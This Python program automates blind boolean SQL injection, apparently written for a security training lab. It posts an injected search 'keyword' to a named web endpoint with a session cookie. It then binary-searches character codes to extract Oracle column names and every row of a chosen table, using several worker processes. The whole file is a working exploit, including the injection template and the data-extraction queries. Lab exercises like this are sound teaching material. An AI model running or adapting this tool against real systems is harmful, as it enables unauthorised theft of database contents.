from multiprocessing.managers import BaseManager
import time, sys, os
import requests
import multiprocessing as mp
from abc import *
from PyQt5 import QtCore, QtWidgets
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *

# 프로세스간 데이터 공유를 위한 클래스
class Data():
    def __init__(self, uiQueue:mp.Queue):
        self.tableName = ''
        self.columnNames = []
        self.allData = []
        self.status = ''
        self.cookie = ''
        self.uiQueue = uiQueue

    def updateStatus(self, status:str):
        self.status = status
        self.update()
    
    def updateTableName(self, tableName:str):
        self.tableName = tableName
        self.update()

    def updateCookie(self, cookie:str):
        self.cookie = cookie

    def updateColumnNames(self, columnNames:list):
        self.columnNames = columnNames
        self.update()

    def addData(self, data:list):
        self.allData.append(data)
        self.update()

    def getTableName(self):
        return self.tableName
    def getCookie(self):
        return self.cookie
    def getColumnNames(self):
        return self.columnNames
    def getAllData(self):
        return self.allData
    def getStatus(self):
        return self.status

    # 데이터 변경시 UI에 알림
    def update(self):
        self.uiQueue.put([self.tableName, self.columnNames, self.allData, self.status])


class DataManager(BaseManager):
    pass
dataManager = None
# dataManager 생성 함수
def getManager() -> DataManager:
    if dataManager is None:
        DataManager.register('Data', Data)
        manager = DataManager()
        manager.start()
        return manager
    else:
        return dataManager


class GetQueryWorker(mp.Process):
    def __init__(self, data:DataManager, inQueue:mp.Queue, outQueue:mp.Queue):
        super(GetQueryWorker, self).__init__()
        self.data = data
        self.URL = 'http://elms1.skinfosec.co.kr:8082/community6/free'
        self.headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
        self.cookies = {'JSESSIONID' : self.data.getCookie()}
        self.sqliquery = "test%' and {} and '1%'='1"
        self.inQueue = inQueue
        self.outQueue = outQueue

    # 실제 쿼리를 보내는 함수
    def sendQuery(self, query:str):
        self.data.updateStatus(query)

        parameter = {'startDt':'', 'endDt':'', 'searchType':'all','keyword':''}
        parameter['keyword'] = query
        response = requests.post(self.URL, headers=self.headers, cookies=self.cookies, data=parameter)
        if '결과가 없습니다.' in response.text:
            return False
        else:
            return True
    
    # binarySearch 함수 구현
    def binarySearch(self, query:str, lo=0, hi=128):
        # hi가 10000넘으면 함수 종료
        if hi>10000:
            return -1

        while lo <= hi:
            mid = (lo + hi) // 2
            if self.sendQuery(query.format(mid)):
                lo = mid+1
            else:
                hi = mid-1

        # 범위 내에 없으면 128보다 클 수 있으므로 다른 범위로 다시 검색
        if self.sendQuery(query.replace('>', '=').format(lo)):
            return lo
        else:
            return self.binarySearch(query, hi, hi*4)

    # run 함수 구현
    # query 결과 리턴
    def run(self):
        while self.inQueue.empty() == False:
            i, j, query = self.inQueue.get()
            time.sleep(1)
            result = self.binarySearch(self.sqliquery.format(query))
            self.outQueue.put( (i, j, result) )

# 쿼리 생성용
class QueryBuilder():
    def tableColumnCount(self, tableName:str):
        return f"(SELECT COUNT(COLUMN_NAME) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{tableName}') > {{}}"
    def columnNameLength(self, tableName:str, columnNumber:int):
        return f"LENGTH((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = '{tableName}') WHERE RNUM = {columnNumber})) > {{}}"
    def columnNameChar(self, tableName:str, columnNumber:int, charNumber:int):
        return f"ASCII(SUBSTR((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = '{tableName}') WHERE RNUM = {columnNumber}), {charNumber}, 1)) > {{}}"
    def dataCount(self, tableName:str):
        return f"(SELECT COUNT(*) FROM {tableName}) > {{}}"
    def dataLength(self, tableName:str, columnName:str, rowNumber:int):
        return f"LENGTH((SELECT {columnName} FROM (SELECT ROWNUM RNUM, {columnName} FROM {tableName}) WHERE RNUM={rowNumber})) > {{}}"
    def dataChar(self, tableName:str, columnName:str, rowNumber:int, charNumber:int):
        return f"ASCII(SUBSTR((SELECT {columnName} FROM (SELECT ROWNUM RNUM, {columnName} FROM {tableName}) WHERE RNUM={rowNumber}), {charNumber}, 1)) > {{}}"

class MainProgram(mp.Process):
    def __init__(self, processNum:int, manager:mp.Manager, dataManager:DataManager, uiInQueue:mp.Queue, uiOutQueue:mp.Queue) -> None:
        super(MainProgram, self).__init__()
        self.builder = QueryBuilder()
        self.uiInQueue = uiInQueue
        self.uiOutQueue = uiOutQueue
        self.data = dataManager.Data(self.uiInQueue)
        self.inQueue = manager.Queue()
        self.outQueue = manager.Queue()
        self.processNum = processNum
    
    # input 값 받아서 data에 저장
    def getInput(self) -> None:
        if self.uiOutQueue.empty()==True:
            self.uiInQueue.put('cookie')
            self.data.updateCookie(self.uiOutQueue.get())
        if self.uiOutQueue.empty()==True:
            self.uiInQueue.put('tableName')
            self.data.updateTableName(self.uiOutQueue.get())

    # 컬럼 정보 가져오기
    def getTableColumns(self) -> None:
        self.data.updateStatus('테이블 컬럼 수 가져오는 중')
        query = self.builder.tableColumnCount(self.data.getTableName())
        self.inQueue.put( (0, 0, query) )

        worker = GetQueryWorker(self.data, self.inQueue, self.outQueue)
        worker.start()
        worker.join()

        columnCount = self.outQueue.get()[-1]
        self.data.updateStatus('테이블 컬럼 수 가져오기 완료')

        self.data.updateStatus('테이블 컬럼 이름 길이 가져오는 중')
        for i in range(1, columnCount+1):
            self.inQueue.put( (i, 0, self.builder.columnNameLength(self.data.getTableName(), i)) )
        
        workers = [GetQueryWorker(self.data, self.inQueue, self.outQueue) for _ in range(self.processNum)]
        for worker in workers:
            worker.start()
        for worker in workers:
            worker.join()

        columnsLength = [0 for _ in range(columnCount)]
        while self.outQueue.empty() == False:
            i, j, result = self.outQueue.get()
            columnsLength[i-1] = result
        columns = [''*l for l in columnsLength]
        self.data.updateColumnNames(columns)
        self.data.updateStatus('테이블 컬럼 이름 길이 가져오기 완료')

        self.data.updateStatus('테이블 컬럼 이름 가져오는 중')
        for i in range(1, columnCount+1):
            for j in range(1, columnsLength[i-1]+1):
                self.inQueue.put( (i, j, self.builder.columnNameChar(self.data.getTableName(), i, j)) )
        
        workers = [GetQueryWorker(self.data, self.inQueue, self.outQueue) for _ in range(self.processNum)]
        for worker in workers:
            worker.start()
        for worker in workers:
            worker.join()

        columns = [['' for j in range(columnsLength[i])] for i in range(columnCount)]
        while self.outQueue.empty() == False:
            i, j, result = self.outQueue.get()
            columns[i-1][j-1] = chr(result)
        for i in range(columnCount):
            columns[i] = ''.join(columns[i])

        self.data.updateColumnNames(columns)
        self.data.updateStatus('테이블 컬럼 이름 가져오기 완료')

    # 모든 데이터 가져오는 함수
    def getAllData(self) -> None:
        columnNames = self.data.getColumnNames()
        tableName = self.data.getTableName()

        self.data.updateStatus('데이터 수 가져오는 중')
        query = self.builder.dataCount(tableName)
        self.inQueue.put( (0, 0, query) )

        worker = GetQueryWorker(self.data, self.inQueue, self.outQueue)
        worker.start()
        worker.join()

        dataCount = self.outQueue.get()[-1]
        self.data.updateStatus('데이터 수 가져오기 완료')

        
        for i in range(1, dataCount+1):
            self.data.updateStatus(f'{i}번째 데이터 길이 가져오는 중')
            for j in range(len(columnNames)):
                self.inQueue.put( (i, j, self.builder.dataLength(tableName, columnNames[j], i)) )
            
            workers = [GetQueryWorker(self.data, self.inQueue, self.outQueue) for _ in range(self.processNum)]
            for worker in workers:
                worker.start()
            for worker in workers:
                worker.join()

            dataLength = [0 for _ in range(len(columnNames))]
            while self.outQueue.empty() == False:
                i, j, result = self.outQueue.get()
                dataLength[j] = result
            self.data.updateStatus(f'{i}번째 데이터 길이 가져오기 완료')

            self.data.updateStatus(f'{i}번째 데이터 가져오는 중')
            for j in range(len(columnNames)):
                for k in range(1, dataLength[j]+1):
                    self.inQueue.put( (j, k, self.builder.dataChar(tableName, columnNames[j], i, k)) )
            
            workers = [GetQueryWorker(self.data, self.inQueue, self.outQueue) for _ in range(self.processNum)]
            for worker in workers:
                worker.start()
            for worker in workers:
                worker.join()

            data = [['' for k in range(dataLength[j])] for j in range(len(columnNames))]
            while self.outQueue.empty() == False:
                j, k, result = self.outQueue.get()
                data[j][k-1] = chr(result)
            for j in range(len(columnNames)):
                data[j] = ''.join(data[j])

            self.data.addData(data)
            self.data.updateStatus(f'{i}번째 데이터 가져오기 완료')
    
    # 메인 함수
    def run(self) -> None:
        self.getInput()
        self.getTableColumns()
        self.getAllData()
        # 출력 테스트
        # self.data.updateColumnNames(['ANSWER', 'REG_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID'])
        # self.data.addData(['ant6', '03-JUL-19', 'U180623-00001', '03-JUL-19', 'U180623-00001'])
        self.uiInQueue.put('exit')